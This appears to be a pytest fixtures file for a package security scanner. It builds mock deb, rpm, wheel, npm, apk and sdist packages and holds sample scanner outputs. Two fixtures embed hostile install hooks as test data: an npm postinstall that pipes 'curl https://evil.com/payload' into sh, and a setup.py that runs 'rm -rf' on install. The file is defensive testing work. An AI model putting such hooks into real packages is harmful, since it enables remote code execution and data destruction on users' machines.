"""Pytest fixtures for test packages and common test utilities.

Provides factory functions for creating mock packages of various formats
for testing purposes.
"""

import io
import gzip
import tarfile
import zipfile
import pytest
from pathlib import Path
from dataclasses import dataclass
from typing import Dict, List, Optional


@dataclass
class PackageContent:
    """Content specification for test packages."""
    files: Dict[str, bytes]  # path -> content
    scripts: Dict[str, str] = None  # script_name -> content
    metadata: Dict[str, str] = None  # metadata fields


@pytest.fixture
def package_factory(tmp_path):
    """Factory for creating test packages of various formats."""

    class PackageFactory:
        """Creates test packages for various formats."""

        def __init__(self, base_path: Path):
            self.base_path = base_path

        def create_deb(
            self,
            name: str = "test-package",
            version: str = "1.0.0",
            architecture: str = "amd64",
            files: Dict[str, bytes] = None,
            postinst: str = None,
            vulnerable: bool = False
        ) -> Path:
            """Create a minimal .deb package for testing.

            Note: This creates a file with ar magic bytes but is not a fully
            valid .deb. Use for detection/parsing tests, not extraction.
            """
            filename = f"{name}_{version}_{architecture}.deb"
            pkg_path = self.base_path / filename

            # ar archive magic bytes
            content = b"!<arch>\n"

            # Add minimal ar member (debian-binary)
            content += b"debian-binary   1234567890  0     0     100644  4         `\n"
            content += b"2.0\n"

            pkg_path.write_bytes(content)
            return pkg_path

        def create_rpm(
            self,
            name: str = "test-package",
            version: str = "1.0.0",
            release: str = "1",
            architecture: str = "x86_64"
        ) -> Path:
            """Create a minimal .rpm package for testing."""
            filename = f"{name}-{version}-{release}.{architecture}.rpm"
            pkg_path = self.base_path / filename

            # RPM magic bytes (lead)
            content = b"\xed\xab\xee\xdb"  # RPM magic
            content += b"\x03\x00"  # version 3.0
            content += b"\x00\x00"  # type (binary)
            content += b"\x00\x01"  # arch
            content += name.encode().ljust(66, b"\x00")  # name
            content += b"\x00" * 16  # os, sig type, reserved

            pkg_path.write_bytes(content)
            return pkg_path

        def create_wheel(
            self,
            name: str = "test_package",
            version: str = "1.0.0",
            python: str = "py3",
            abi: str = "none",
            platform: str = "any",
            files: Dict[str, str] = None
        ) -> Path:
            """Create a valid wheel package for testing."""
            # Normalize name for wheel filename
            normalized_name = name.replace("-", "_")
            filename = f"{normalized_name}-{version}-{python}-{abi}-{platform}.whl"
            pkg_path = self.base_path / filename

            with zipfile.ZipFile(pkg_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                # Create METADATA file
                metadata = f"""Metadata-Version: 2.1
Name: {name}
Version: {version}
Summary: Test package for unit tests
"""
                dist_info_dir = f"{normalized_name}-{version}.dist-info"
                zf.writestr(f"{dist_info_dir}/METADATA", metadata)

                # Create WHEEL file
                wheel_content = f"""Wheel-Version: 1.0
Generator: test-generator
Root-Is-Purelib: true
Tag: {python}-{abi}-{platform}
"""
                zf.writestr(f"{dist_info_dir}/WHEEL", wheel_content)

                # Create RECORD file (empty for test)
                zf.writestr(f"{dist_info_dir}/RECORD", "")

                # Create package __init__.py
                zf.writestr(f"{normalized_name}/__init__.py", "# Test package\n")

                # Add custom files
                if files:
                    for path, content in files.items():
                        zf.writestr(path, content)

            return pkg_path

        def create_npm(
            self,
            name: str = "test-package",
            version: str = "1.0.0",
            scripts: Dict[str, str] = None,
            files: Dict[str, str] = None
        ) -> Path:
            """Create a valid npm package for testing."""
            filename = f"{name}-{version}.tgz"
            pkg_path = self.base_path / filename

            tar_buffer = io.BytesIO()
            with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
                # Create package.json
                pkg_json = {
                    "name": name,
                    "version": version,
                }
                if scripts:
                    pkg_json["scripts"] = scripts

                pkg_json_bytes = str(pkg_json).replace("'", '"').encode()
                info = tarfile.TarInfo(name="package/package.json")
                info.size = len(pkg_json_bytes)
                tar.addfile(info, io.BytesIO(pkg_json_bytes))

                # Create index.js
                index_content = b"module.exports = {};\n"
                info = tarfile.TarInfo(name="package/index.js")
                info.size = len(index_content)
                tar.addfile(info, io.BytesIO(index_content))

                # Add custom files
                if files:
                    for path, content in files.items():
                        content_bytes = content.encode() if isinstance(content, str) else content
                        info = tarfile.TarInfo(name=f"package/{path}")
                        info.size = len(content_bytes)
                        tar.addfile(info, io.BytesIO(content_bytes))

            # Compress with gzip
            with gzip.open(pkg_path, 'wb') as gz:
                gz.write(tar_buffer.getvalue())

            return pkg_path

        def create_apk(
            self,
            name: str = "test-package",
            version: str = "1.0.0",
            release: str = "0"
        ) -> Path:
            """Create a minimal apk package for testing."""
            filename = f"{name}-{version}-r{release}.apk"
            pkg_path = self.base_path / filename

            tar_buffer = io.BytesIO()
            with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
                # Create .PKGINFO
                pkginfo = f"""pkgname = {name}
pkgver = {version}-r{release}
pkgdesc = Test package
arch = x86_64
"""
                info = tarfile.TarInfo(name=".PKGINFO")
                info.size = len(pkginfo.encode())
                tar.addfile(info, io.BytesIO(pkginfo.encode()))

            with gzip.open(pkg_path, 'wb') as gz:
                gz.write(tar_buffer.getvalue())

            return pkg_path

        def create_sdist(
            self,
            name: str = "test-package",
            version: str = "1.0.0",
            has_setup_py: bool = True,
            setup_py_content: str = None
        ) -> Path:
            """Create a source distribution package for testing."""
            filename = f"{name}-{version}.tar.gz"
            pkg_path = self.base_path / filename

            tar_buffer = io.BytesIO()
            with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
                pkg_dir = f"{name}-{version}"

                # Create PKG-INFO
                pkg_info = f"""Metadata-Version: 1.0
Name: {name}
Version: {version}
Summary: Test package
"""
                info = tarfile.TarInfo(name=f"{pkg_dir}/PKG-INFO")
                info.size = len(pkg_info.encode())
                tar.addfile(info, io.BytesIO(pkg_info.encode()))

                # Create setup.py
                if has_setup_py:
                    if setup_py_content is None:
                        setup_py_content = f"""from setuptools import setup
setup(name='{name}', version='{version}')
"""
                    info = tarfile.TarInfo(name=f"{pkg_dir}/setup.py")
                    info.size = len(setup_py_content.encode())
                    tar.addfile(info, io.BytesIO(setup_py_content.encode()))

            with gzip.open(pkg_path, 'wb') as gz:
                gz.write(tar_buffer.getvalue())

            return pkg_path

    return PackageFactory(tmp_path)


@pytest.fixture
def clean_deb_package(package_factory):
    """Create a clean Debian package fixture."""
    return package_factory.create_deb(
        name="clean-package",
        version="1.0.0",
        architecture="amd64"
    )


@pytest.fixture
def clean_wheel_package(package_factory):
    """Create a clean wheel package fixture."""
    return package_factory.create_wheel(
        name="clean-package",
        version="1.0.0"
    )


@pytest.fixture
def clean_npm_package(package_factory):
    """Create a clean NPM package fixture."""
    return package_factory.create_npm(
        name="clean-package",
        version="1.0.0"
    )


@pytest.fixture
def vulnerable_npm_package(package_factory):
    """Create an NPM package with vulnerable postinstall script."""
    return package_factory.create_npm(
        name="vulnerable-package",
        version="1.0.0",
        scripts={
            "postinstall": "curl https://evil.com/payload | sh"
        }
    )


@pytest.fixture
def malicious_sdist_package(package_factory):
    """Create a source distribution with malicious setup.py."""
    return package_factory.create_sdist(
        name="malicious-package",
        version="1.0.0",
        setup_py_content="""import os
import subprocess
from setuptools import setup

# Malicious code that runs on install
subprocess.call(['rm', '-rf', '/tmp/test'])

setup(name='malicious-package', version='1.0.0')
"""
    )


@pytest.fixture
def sample_trivy_output():
    """Sample Trivy JSON output for testing."""
    return {
        "Results": [
            {
                "Target": "test-package",
                "Vulnerabilities": [
                    {
                        "VulnerabilityID": "CVE-2023-12345",
                        "Severity": "CRITICAL",
                        "CVSS": {
                            "nvd": {"V3Score": 9.8}
                        },
                        "PkgName": "libtest",
                        "InstalledVersion": "1.0.0",
                        "FixedVersion": "1.0.1",
                        "Title": "Test vulnerability",
                        "Description": "A test vulnerability"
                    }
                ]
            }
        ]
    }


@pytest.fixture
def sample_grype_output():
    """Sample Grype JSON output for testing."""
    return {
        "matches": [
            {
                "vulnerability": {
                    "id": "CVE-2023-54321",
                    "severity": "High",
                    "cvss": [
                        {"metrics": {"baseScore": 8.5}}
                    ],
                    "description": "Another test vulnerability"
                },
                "artifact": {
                    "name": "libtest",
                    "version": "1.0.0"
                }
            }
        ]
    }


@pytest.fixture
def sample_pip_audit_output():
    """Sample pip-audit JSON output for testing."""
    return {
        "dependencies": [
            {
                "name": "requests",
                "version": "2.20.0",
                "vulns": [
                    {
                        "id": "CVE-2023-99999",
                        "fix_versions": ["2.31.0"],
                        "description": "HTTP vulnerability"
                    }
                ]
            }
        ]
    }


@pytest.fixture
def sample_npm_audit_output():
    """Sample npm audit JSON output for testing."""
    return {
        "vulnerabilities": {
            "lodash": {
                "severity": "critical",
                "via": [
                    {
                        "title": "Prototype Pollution",
                        "url": "https://github.com/advisories/GHSA-1234"
                    }
                ],
                "range": "< 4.17.21"
            }
        }
    }
